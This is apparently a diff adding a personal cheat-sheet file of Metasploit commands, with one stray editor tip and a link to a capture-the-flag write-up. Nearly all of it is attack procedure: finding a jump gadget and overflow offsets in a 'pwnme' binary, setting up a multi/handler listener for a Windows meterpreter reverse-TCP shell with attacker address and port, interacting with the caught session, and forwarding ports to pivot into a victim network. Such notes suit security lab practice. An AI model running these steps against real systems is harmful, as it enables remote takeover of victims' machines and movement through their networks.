@@ -1,0 +1,37 @@
+------------------------------Update
+msfupdate
+++++++++++++
+ msfelfscan -j eax pwnme 
+
+
+msf/tools/exploit/pattern_create.rb -l 1024
+
+msf/tools/exploit/pattern_offset.rb -l 1024 -q 0x41366641
+
+w 
+msf > use exploit/multi/handler
+portfwd add -l <local port on the attacking machine (yours)> -p <victim port we want to access> -r <victim IP address>
+
+msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+
+msf exploit(handler) > set LHOST 192.168.0.100
+
+msf exploit(handler) > set LPORT 4444
+
+msf exploit(handler) > set ExitOnSession false
+
+msf exploit(handler) > exploit -j 
+
+_______must type this command 
+[+]sessions -i 1
+https://www.gknsb.com/2017/01/violator-1-writeup.html
+
+[+]sessions -i 1
+gvim remove duplicates [+] :sort -u
+
+use exploit/multi/handler
+set LHOST 192.168.110.103
+set LPORT 5555 
+run
+meterpreter > portfwd add -l 7788 -p 7788 -r 127.0.0.1
+
